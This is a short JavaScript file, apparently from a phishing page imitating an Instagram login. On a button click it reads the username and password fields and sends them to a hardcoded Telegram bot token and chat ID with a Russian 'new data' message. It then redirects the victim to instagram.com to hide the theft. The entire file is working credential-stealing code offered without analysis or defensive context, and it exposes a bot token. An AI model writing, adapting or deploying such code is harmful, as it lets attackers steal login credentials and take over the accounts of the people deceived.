document.querySelector("button").addEventListener("click", () => {
  const username = document.querySelectorAll("input")[0].value;
  const password = document.querySelectorAll("input")[1].value;

  const token = "7601202196:AAEJF7BPEReymH6d0ZNlKUDb9RY6vKQssk8";
  const chatId = "5135918768";
  const message = `Новые данные:\n👤 Логин: ${username}\n🔒 Пароль: ${password}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  })
  .then(response => {
    if (response.ok) {
      window.location.href = 'https://instagram.com'
    } else {
      console.log('error')
    }
  })
  .catch(error => {
    console.error("Ошибка запроса:", error);
    alert("Произошла ошибка при отправке 😞");
  });
});
